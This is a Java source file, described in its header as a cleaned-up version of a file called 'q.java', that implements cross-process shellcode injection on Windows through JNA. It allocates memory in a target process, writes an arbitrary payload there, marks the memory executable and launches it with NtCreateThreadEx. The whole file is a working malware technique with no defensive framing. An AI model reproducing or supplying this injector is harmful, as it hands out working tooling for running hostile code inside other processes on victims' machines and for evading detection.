import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.ptr.PointerByReference;
import java.nio.charset.StandardCharsets;

/**
 * Cleaned ShellcodeInjector (formerly q.java)
 * Implements cross-process shellcode injection.
 */
public class ShellcodeInjector {

    /**
     * Injects shellcode into a target process and executes it.
     * @param hProcess Handle to the target process.
     * @param shellcode The binary payload to inject.
     * @param entryPoint The entry point function name (if applicable).
     */
    public static void inject(WinNT.HANDLE hProcess, byte[] shellcode, String entryPoint) throws Exception {
        int scSize = shellcode.length;
        byte[] extraData = (entryPoint + "\0").getBytes(StandardCharsets.UTF_16LE);
        int totalSize = scSize + extraData.length;

        PointerByReference baseAddress = new PointerByReference();
        PointerByReference sizePointer = new PointerByReference(new Pointer(totalSize));

        // 1. Allocate memory in target process (PAGE_READWRITE)
        if (ShellcodeApi.INSTANCE.NtAllocateVirtualMemory(hProcess, baseAddress, null, sizePointer, 0x3000, 4) != 0) {
            throw new Exception("Allocation failed");
        }

        Pointer base = baseAddress.getValue();

        // 2. Write shellcode
        ShellcodeApi.INSTANCE.NtWriteVirtualMemory(hProcess, base, shellcode, scSize, new IntByReference());

        // 3. Write entry point string (for use by the shellcode)
        Pointer extraBase = base.share(scSize);
        ShellcodeApi.INSTANCE.NtWriteVirtualMemory(hProcess, extraBase, extraData, extraData.length, new IntByReference());

        // 4. Change protection to PAGE_EXECUTE_READ (0x20)
        ShellcodeApi.INSTANCE.NtProtectVirtualMemory(hProcess, baseAddress, sizePointer, 0x20, new IntByReference());

        // 5. Create remote thread to execute shellcode
        PointerByReference hThread = new PointerByReference();
        if (ShellcodeApi.INSTANCE.NtCreateThreadEx(hThread, 0x1FFFFF, null, hProcess, base, extraBase, 0, 0, 0, 0, null) != 0) {
            throw new Exception("Thread creation failed");
        }
    }
}
